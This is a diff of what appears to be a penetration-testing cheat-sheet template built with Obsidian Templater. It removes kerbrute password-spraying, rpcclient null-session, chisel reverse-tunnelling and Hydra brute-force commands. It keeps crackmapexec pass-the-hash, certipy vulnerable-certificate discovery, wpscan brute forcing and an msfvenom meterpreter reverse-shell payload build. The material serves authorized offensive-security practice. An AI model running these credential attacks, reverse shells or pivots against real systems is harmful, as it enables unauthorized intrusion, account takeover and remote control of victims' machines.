@@ -336,12 +336,6 @@ crackmapexec winrm <% tp.frontmatter["RHOST"] %> -u "<% tp.frontmatter["USERNAME
 crackmapexec winrm <% tp.frontmatter["RHOST"] %>  -u "<% tp.frontmatter["USERNAME"] %>" -H '' -d <% tp.frontmatter["DOMAIN"] %> --continue-on-success
 ```
 
-# Kerbrute
-```bash
-./kerbrute userenum -d <% tp.frontmatter["DOMAIN"] %> --dc <% tp.frontmatter["DOMAIN"] %> /PATH/TO/FILE/<USERNAMES>
-./kerbrute passwordspray -d <% tp.frontmatter["DOMAIN"] %> --dc <% tp.frontmatter["DOMAIN"] %> /PATH/TO/FILE/<USERNAMES> <% tp.frontmatter["PASSWORD"] %>
-```
-
 
 #ldap
 ```bash
@@ -394,11 +388,6 @@ certipy find -dc-ip <% tp.frontmatter["PASSWORD"] %> -u <% tp.frontmatter["USERN
 certipy find -dc-ip <% tp.frontmatter["PASSWORD"] %> -u <% tp.frontmatter["USERNAME"] %> -p <% tp.frontmatter["PASSWORD"] %> -vulnerable -stdout
 ```
 
-#rpcclient
-```bash
-rpcclient -U "" <% tp.frontmatter["RHOST"] %>
-```
-
 # msfvenom && metasploit execution
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<% tp.frontmatter["LHOST"] %> LPORT=<LPORT> -b "\x00\x0a" -a x86 --platform windows -f exe -o exploit.exe
@@ -430,19 +419,6 @@ sudo ip route add x.x.x.x dev ligolo
 
 help command
 listener_add --addr 0.0.0.0:8000 --to 127.0.0.1:7777 --tcp
-
-
-#chisel
-#Run command on attacker machine
-chisel server -p 8888 --reverse
-#<socks>Run command on Web Server machine
- .  .\chisel.exe client <% tp.frontmatter["LHOST"] %>:8001 R:1080:socks
-and edit the proxychains with the port that chisel provided
-
-#When trying to connect to a local port
-C:\\xampp\\htdocs>.\\chisel.exe client 192.168.45.176:8888 R:8090:localhost:80
-
-```
 
 
 ## Protocols
@@ -513,12 +489,7 @@ Use Wordlist to bruteforce the user password
 wpscan –url 192.168.189.142 –wordlist /usr/share/wordlists/rockyou.txt –username admin
 
 
-# Hydra
-hydra <% tp.frontmatter["RHOST"] %> -l <% tp.frontmatter["USERNAME"] %> -P /usr/share/wordlists/<FILE> ftp|ssh|smb://<% tp.frontmatter["RHOST"] %>
-hydra -l <% tp.frontmatter["USERNAME"] %> -P /usr/share/wordlists/rockyou.txt <% tp.frontmatter["RHOST"] %> http-post-form "/admin.php:username=^USER^&password=^PASS^:login_error"
 
-sudo hydra -L /usr/share/wordlists/rockyou.txt -p "<% tp.frontmatter["PASSWORD"] %>" rdp://<% tp.frontmatter["RHOST"] %>
-sudo hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://<% tp.frontmatter["RHOST"] %>
 
 #crowbar
 #  RDP brute forcing a single IP address using a single username and a single password:
